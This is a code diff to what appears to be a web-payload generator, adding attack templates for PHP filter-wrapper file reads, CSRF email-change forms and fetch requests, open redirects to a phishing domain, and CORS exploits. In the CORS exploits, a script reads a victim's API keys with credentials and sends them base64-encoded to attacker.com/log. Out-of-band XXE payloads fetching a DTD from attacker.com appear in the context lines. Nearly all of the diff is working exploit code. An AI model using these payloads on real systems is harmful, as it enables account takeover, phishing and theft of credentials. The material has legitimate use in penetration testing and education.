@@ -53,7 +53,8 @@ const VulnData = {
     ],
     actions: [
       { id: 'read_passwd', label: 'Read /etc/passwd' },
-      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' }
+      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' },
+      { id: 'php_wrapper', label: 'PHP Wrapper (Base64 Extract)' }
     ]
   },
   cmdi: {
@@ -85,6 +86,34 @@ const VulnData = {
     actions: [
       { id: 'local_file', label: 'Read Local File (/etc/passwd)' },
       { id: 'oob', label: 'Out-Of-Band (OOB) Extraction' }
+    ]
+  },
+  csrf: {
+    contexts: [
+      { id: 'html_form', label: 'Auto-submitting HTML Form' },
+      { id: 'ajax_fetch', label: 'AJAX / Fetch API Request' }
+    ],
+    actions: [
+      { id: 'state_change', label: 'State Change (e.g. Change Email)' }
+    ]
+  },
+  open_redirect: {
+    contexts: [
+      { id: 'url_param', label: 'URL Parameter (e.g. ?redirect=[here])' },
+      { id: 'path_based', label: 'Path-based (e.g. /out/[here])' }
+    ],
+    actions: [
+      { id: 'phishing', label: 'Redirect to Phishing Domain' },
+      { id: 'js_exec', label: 'JavaScript Execution (javascript:alert)' }
+    ]
+  },
+  cors: {
+    contexts: [
+      { id: 'null_origin', label: 'Null Origin Reflection' },
+      { id: 'arb_origin', label: 'Arbitrary Origin Reflection' }
+    ],
+    actions: [
+      { id: 'steal_api', label: 'Exfiltrate API Keys via XHR (withCredentials)' }
     ]
   }
 };
@@ -177,6 +206,10 @@ const PayloadTemplates = {
     read_win_ini: {
       direct_file: { code: "C:\\Windows\\win.ini", desc: "Absolute path for Windows systems." },
       path_traversal: { code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", desc: "Windows path traversal using backslashes." }
+    },
+    php_wrapper: {
+      direct_file: { code: "php://filter/convert.base64-encode/resource=index.php", desc: "Uses PHP filters to Base64 encode the target file before it is executed/included. This allows reading backend source code." },
+      path_traversal: { code: "php://filter/convert.base64-encode/resource=../../../../config.php", desc: "Combines path traversal with PHP Base64 filters to read configuration files safely without triggering execution." }
     }
   },
   cmdi: {
@@ -211,6 +244,28 @@ const PayloadTemplates = {
     oob: {
       classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>", desc: "Out-of-band XXE. Fetches a remote DTD from the attacker server which then defines entities to send data back." },
       soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><soapenv:Envelope><soapenv:Body>&send;</soapenv:Body></soapenv:Envelope>", desc: "Out-of-band XXE mapped into a SOAP body." }
+    }
+  },
+  csrf: {
+    state_change: {
+      html_form: { code: "<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://vulnerable.com/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\" />\n    </form>\n  </body>\n</html>", desc: "Auto-submitting HTML form. When the victim visits this page, their browser automatically submits a POST request to change their email." },
+      ajax_fetch: { code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>", desc: "AJAX based CSRF. Uses fetch with `credentials: 'include'` to send the victim's cookies automatically." }
+    }
+  },
+  open_redirect: {
+    phishing: {
+      url_param: { code: "http://attacker.com", desc: "Basic redirect to a phishing domain." },
+      path_based: { code: "//attacker.com", desc: "Protocol-relative URL. Bypasses filters that check if the URL starts with a single `/`." }
+    },
+    js_exec: {
+      url_param: { code: "javascript:alert(document.cookie)", desc: "If the application uses the redirect parameter inside an `href` attribute without validation, this executes JavaScript." },
+      path_based: { code: "javascript:alert(document.cookie)", desc: "Executes JavaScript via the javascript pseudo-protocol." }
+    }
+  },
+  cors: {
+    steal_api: {
+      null_origin: { code: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>\"></iframe>", desc: "Exploits a server that trusts the `null` origin. Uses an iframe with a restrictive sandbox to force a `null` origin, then sends an authenticated XHR request to steal API keys." },
+      arb_origin: { code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>", desc: "Exploits a server that trusts any arbitrary origin. A script hosted on `attacker.com` makes an authenticated request and exfiltrates the response." }
     }
   }
 };
